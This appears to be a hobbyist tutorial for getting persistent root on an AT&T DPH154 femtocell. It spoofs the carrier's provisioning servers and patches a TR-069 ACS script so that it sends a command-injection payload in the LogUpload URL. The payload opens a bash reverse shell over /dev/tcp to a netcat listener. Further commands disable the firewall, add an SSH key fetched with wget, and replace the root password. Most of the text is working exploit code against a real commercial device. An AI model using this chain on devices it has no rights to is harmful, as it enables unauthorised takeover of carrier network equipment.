# Obtaining Persistent Root on the AT&T DPH154 Femtocell
The beginning process is extremely similar to the DPH153-AT root environment, with just a couple of changes.
I have not tried this on multiple femtos, just the one I have. Start by cloning this repository: https://github.com/nickvsnetworking/DPH153-AT

Once you've done that, hook your femto into your PC. I did this with a USB ethernet adapter, as I was already using ethernet on my PC. You will need internet for this (if you want to do it over SSH), so I recommend a USB adapter.

Then, we have to install our dependencies:
```sh
sudo apt update
sudo apt install python3 dnsmasq chrony tcpdump netcat-openbsd openssl openssh-client
```

Next, CD into the folder you cloned the repo into. Make some environment variables...it'll make your life a ton easier.
```sh
cd ~/DPH153-AT
IFACE=enxf44dad02a5f8 # replace this with the name of the direct interface to the femto (ip -br link)
FEMTO_MAC=48:1d:70:48:32:9c # replace with the mac of your femto
LAB="$PWD/dph154-lab" #make a dir to keep our work in
mkdir "$LAB"
```

Alright, cool. Let's get the networking set up. This adds the DHCP range for the DHCP server, the IPs of your ACS/CWMP, and static routes for the NTP servers the femto pulls from:
```sh
umask 077
sudo ip link set "$IFACE" up
sudo ip addr add 192.168.154.11/24 dev "$IFACE"
sudo ip addr add 10.179.1.202/32 dev "$IFACE"
sudo ip addr add 10.179.1.203/32 dev "$IFACE"
for ip in 12.230.209.5 12.230.209.133 12.230.208.133 12.230.208.48; do
  sudo ip addr add "$ip/32" dev "$IFACE"
done
```

Next, we have to allow the DHCP range in chrony, the NTP server we'll be using!
```sh
sudo chronyc allow 192.168.154.0/24
```

Next, configure all the DHCP and DNS settings in dnsmasq. This will create a config in our lab folder, and then run dnsmasq with our config:
```sh
cat > "$LAB/dnsmasq.conf" <<EOF
interface=$IFACE
bind-dynamic
listen-address=192.168.154.11
port=53
dhcp-range=192.168.154.50,192.168.154.99,255.255.255.0,12h
dhcp-host=$FEMTO_MAC,192.168.154.50,dph154,12h
dhcp-option=option:router,192.168.154.11
dhcp-option=option:dns-server,192.168.154.11
dhcp-option=option:ntp-server,192.168.154.11
address=/femtocell.wireless.att.com/10.179.1.203
address=/wireless.att.com/10.179.1.202
log-dhcp
log-queries
log-facility=$LAB/dnsmasq.log
pid-file=$LAB/dnsmasq.pid
EOF
sudo dnsmasq --test -C "$LAB/dnsmasq.conf" #this verifies the config before we use it!
sudo dnsmasq -C "$LAB/dnsmasq.conf"
```

Next, we have to patch the `acs_tr069.py` that comes with the git repo. Run this to patch it automagically:
```sh
cp -p acs/acs_tr069.py "$LAB/acs_tr069.py.original"
python3 - <<'PY'
from pathlib import Path

p = Path("acs/acs_tr069.py")
s = p.read_text()
old = "f'<Value xsi:type=\"xsd:{t}\">{v}</Value></ParameterValueStruct>'"
new = "f'<Value xsi:type=\"xsd:{t}\">{_xml_escape(str(v))}</Value></ParameterValueStruct>'"
assert s.count(old) == 1, "ACS version differs: inspect set_param_values"
s = s.replace(old, new)
marker = 'def set_param_values(params, key="omni-prov"):'
assert s.count(marker) == 1, "ACS version differs: inspect set_param_values"
s = s.replace(marker, "from xml.sax.saxutils import escape as _xml_escape\n\n" + marker)
handle = s.index("def handle(raw, addr):")
start = s.index("    rpc_queue=[", handle)
end = s.index("    reqn=0", start)
replacement = '''    # DPH-154 LogUpload URL command injection; listener is the PC's lab IP.
    PAYLOAD = "https://logupload.wireless.att.com/\\";/bin/bash -c 'setsid bash -i >& /dev/tcp/192.168.154.11/4444 0>&1 &';\\"/"
    rpc_queue=[
      set_param_values([("Device.X_00000C_LogUpload.OnDemand.URL", PAYLOAD, "string")]),
      set_param_values([("Device.X_00000C_LogUpload.OnDemand.Triggered", "1", "boolean")]),
    ]
'''
s = s[:start] + replacement + s[end:]
p.write_text(s)
PY
python3 -m py_compile acs/acs_tr069.py
```

Once you've done that, open a second shell and run this:
```
nc -l -s 192.168.154.11 -p 4444
```
This will open up a reverse root shell as soon as it reaches out to perform ACS provisioning.

In a third terminal, start the ACS server:
```sh
cd ~/DPH153-AT
sudo env OPENSSL_CONF="$PWD/acs/legacy.cnf" python3 acs/acs_tr069.py
```
 
If your femto is on already, power cycle it. If it isn't on, power it on! You can watch the DHCP/DNS requests via `tail -f "$LAB/dnsmasq.log"`. It should get a lease, resolve all the domains, synchronize time, and send a CWMP inform. If it fails, check DHCP/DNS: `sudo tcpdump -ni "$IFACE" 'udp port 123 or tcp port 443'`

You should have been dropped into a root shell in terminal 2. Check: `id` You should see `uid=0(root)`. Congrats! Now, let's persist it.

For posterity, create a new root key on your host. We will serve these to the femto with a small http server:
```sh
cd ~/DPH153-AT
LAB="$PWD/dph154-lab"
umask 077
ssh-keygen -t rsa -b 2048 -f "$LAB/dph154_root" -N ''
mkdir -p "$LAB/www"
cp -p "$LAB/dph154_root.pub" "$LAB/www/root.pub"
cd "$LAB/www"
python3 -m http.server 8080 --bind 192.168.154.11
```

Now to retrieve the files, and back up the previous!
```sh
```sh
cp -p /var/ipaccess/nv_env.sh /var/ipaccess/nv_env.sh.bak-before-root-ssh
mkdir -p /var/ipaccess/root_home/.ssh
chmod 700 /var/ipaccess/root_home/.ssh
if [ -f /var/ipaccess/root_home/.ssh/authorized_keys ]; then
  cp -p /var/ipaccess/root_home/.ssh/authorized_keys /var/ipaccess/root_home/.ssh/authorized_keys.bak-before-root-ssh
fi
wget -O /var/ipaccess/root_home/.ssh/new_root.pub http://192.168.154.11:8080/root.pub
cat /var/ipaccess/root_home/.ssh/new_root.pub >> /var/ipaccess/root_home/.ssh/authorized_keys
chmod 600 /var/ipaccess/root_home/.ssh/authorized_keys
sed -i 's/^ENV_VERBOSE_CONSOLE_ENABLED=.*/ENV_VERBOSE_CONSOLE_ENABLED="TRUE"/' /var/ipaccess/nv_env.sh
sed -i 's/^ENV_FIREWALL_DISABLED=.*/ENV_FIREWALL_DISABLED="TRUE"/' /var/ipaccess/nv_env.sh
grep '^ENV_\(VERBOSE_CONSOLE_ENABLED\|FIREWALL_DISABLED\)' /var/ipaccess/nv_env.sh
```

This should leave the factory key in place too.

Now, let's make this easy and set a root password. Run this c ode block, which will prompt you for a new root password and then set it on the femto:

Back up the existing files first:
```sh
cp -p /etc/passwd /var/ipaccess/passwd.factory.bak-before-root-password
cp -p /etc/passwd /var/ipaccess/passwd.root
cp -p /var/ipaccess/nv_env.sh /var/ipaccess/nv_env.sh.bak-before-passwd-hook
```

Prompt and install new password:
```sh
cd ~/DPH153-AT
LAB="$PWD/dph154-lab"
umask 077
read -rsp 'New DPH-154 root password: ' ROOT_PASSWORD; echo
printf '%s\n' "$ROOT_PASSWORD" | openssl passwd -5 -stdin > "$LAB/root.hash"
unset ROOT_PASSWORD
SSH_OPTS=(-i "$LAB/dph154_root" \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o Ciphers=+aes128-cbc)
ssh "${SSH_OPTS[@]}" root@192.168.154.50 'cat /etc/passwd' > "$LAB/passwd.factory"
python3 - "$LAB" <<'PY'
from pathlib import Path
import sys

lab = Path(sys.argv[1])
lines = (lab / 'passwd.factory').read_text().splitlines(keepends=True)
root_hash = (lab / 'root.hash').read_text().strip()
found = False
for i, line in enumerate(lines):
    if line.startswith('root:'):
        fields = line.rstrip('\n').split(':')
        fields[1] = root_hash
        lines[i] = ':'.join(fields) + '\n'
        found = True
assert found, 'no root entry in passwd.factory'
(lab / 'passwd.updated').write_text(''.join(lines))
PY
```

Send the file:
```sh
cat "$LAB/passwd.updated" | ssh "${SSH_OPTS[@]}" root@192.168.154.50 'cat > /var/ipaccess/passwd.root.new'
```

Back in your Femto SSH, install it:
```sh
cat /var/ipaccess/passwd.root.new > /var/ipaccess/passwd.root
chmod 644 /var/ipaccess/passwd.root
cat >> /var/ipaccess/nv_env.sh <<'EOF'

# Mount the persistent local password database before starting Dropbear.
if [ -f /var/ipaccess/passwd.root ] && ! grep -q ' /etc/passwd ' /proc/mounts; then
    /bin/mount --bind /var/ipaccess/passwd.root /etc/passwd
fi
EOF
bash -n /var/ipaccess/nv_env.sh
. /var/ipaccess/nv_env.sh
grep ' /etc/passwd ' /proc/mount
```

Now, test! From another terminal: `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc root@192.168.154.50`

Here's the fun part. Reboot and verify all your changes! If it worked, congrats! If not, just try all the steps again!